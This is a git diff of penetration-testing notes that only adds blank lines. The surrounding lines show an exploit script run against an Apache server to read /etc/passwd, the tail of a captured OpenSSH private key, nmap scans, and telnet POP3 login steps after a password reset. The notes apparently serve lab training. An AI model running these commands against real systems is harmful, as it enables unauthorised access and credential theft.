@@ -262,7 +262,9 @@ In this case we were able to attack a box based on its apache server version.
 Its important we remember that these are valid initial footholds and we try them.
 ````
 
+
 ![image](https://user-images.githubusercontent.com/127046919/235004773-e29fa522-94c2-415c-954d-a006c3f0f215.png)
+
 
 ````
 /exploit.sh targets.txt /etc/passwd           
@@ -286,6 +288,7 @@ ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
 CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
 -----END OPENSSH PRIVATE KEY-----
 ````
+
 ##### ? notes
 ##### /etc/hosts FQDN
 ###### Background
@@ -393,6 +396,7 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 32.21 seconds
 `````
+
 ![image](https://user-images.githubusercontent.com/127046919/234426419-f8aa53ae-f5f7-4815-92d5-99dfde8ba5fb.png)
 
 
@@ -402,6 +406,7 @@ In this situation we used another service on port 4555 and reset the password of
 ````
 nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 $IP
 ````
+
 ````
 telnet $IP 110 #Connect to pop3
 USER ryuu #Login as user
